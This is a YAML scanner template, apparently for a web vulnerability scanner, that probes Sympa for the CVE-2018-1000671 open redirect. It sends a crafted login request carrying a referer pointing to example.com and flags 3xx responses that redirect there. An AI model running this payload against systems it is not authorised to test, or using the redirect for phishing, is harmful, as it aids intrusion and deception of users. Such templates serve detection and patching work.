name: poc-yaml-sympa-cve-2018-1000671-redirect
binding: cf09ec1b-aba6-476b-986e-8d08a86e82a7
manual: true
detail:
    author: 小z
    links:
        - https://github.com/sympa-community/sympa/issues/268
    vulnerability:
        level: medium
transport: http
set:
    re: '"(?m)^(?:Location\\s*?:\\s*?)(?:https?:\\/\\/|\\/\\/|\\/\\\\\\\\|\\/\\\\)?(?:[a-zA-Z0-9\\-_\\.@]*)example\\.com\\/?"'
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /sympa?referer=https://example.com&passwd=&previous_action=&action=login&action_login=&previous_list=&list=&email=
            follow_redirects: false
        expression: response.status >= 300 && response.status < 400 && re.bmatches(response.raw_header)
expression: r0()
